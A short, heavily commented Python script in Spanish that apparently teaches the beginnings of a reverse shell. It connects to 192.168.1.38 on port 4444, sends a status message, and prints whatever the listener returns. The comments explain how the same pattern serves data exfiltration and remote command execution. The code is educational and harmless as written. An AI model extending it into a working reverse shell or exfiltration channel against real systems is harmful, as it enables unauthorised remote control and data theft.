# Importa el módulo 'socket', que es la biblioteca estándar de Python 
# para manejar comunicaciones de red de bajo nivel.
import socket

# Crea un nuevo objeto socket.
# socket.AF_INET: Especifica que se utilizará direcciones IPv4 (ej. 192.168.1.38).
# socket.SOCK_STREAM: Especifica que se utilizará el protocolo TCP (Transmission Control Protocol),
# que es orientado a conexión y garantiza la entrega de datos.
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Intenta establecer una conexión saliente (outbound) hacia un servidor remoto.
# "192.168.1.38": Es la dirección IP de destino (el servidor que está escuchando).
# 4444: Es el puerto de destino en el servidor.
# NOTA DE SEGURIDAD: El puerto 4444 es comúnmente asociado con herramientas de pentesting 
# como Metasploit. Una conexión saliente a este puerto es una señal de alerta para los defensivos.
connection.connect(("192.168.1.38", 4444))

# ENVÍO DE DATOS (Exfiltración o Confirmación)
# Envía una cadena de bytes a través del túnel TCP hacia el servidor (192.168.1.38).
# En un ataque, aquí se podrían enviar datos robados. En este caso, es un mensaje de 'estado'.
# NOTA: En Python 3, los strings deben codificarse a bytes, ej: .encode('utf-8')
# connection.send(" [+]Conexion Exitosamente Establecida")
connection.send(" [+]Conexion Exitosamente Establecida".encode('utf-8'))

# RECEPCIÓN DE DATOS (Recepción de Comandos)
# El script se detiene y 'escucha' esperando recibir hasta 1024 bytes de información desde el servidor.
# Esto es crítico: significa que el programa está esperando instrucciones externas.
datos_recibidos = connection.recv(1024)

# EJECUCIÓN O VISUALIZACIÓN
# Imprime en la consola local lo que el servidor remoto envió.
# En un escenario de Reverse Shell, aquí se recibirían los comandos a ejecutar.
print(datos_recibidos)

# CIERRE DE CONEXIÓN
# Termina la comunicación y libera el puerto.
# Nota: La sintaxis correcta en Python es connection.close() con paréntesis.
connection.close()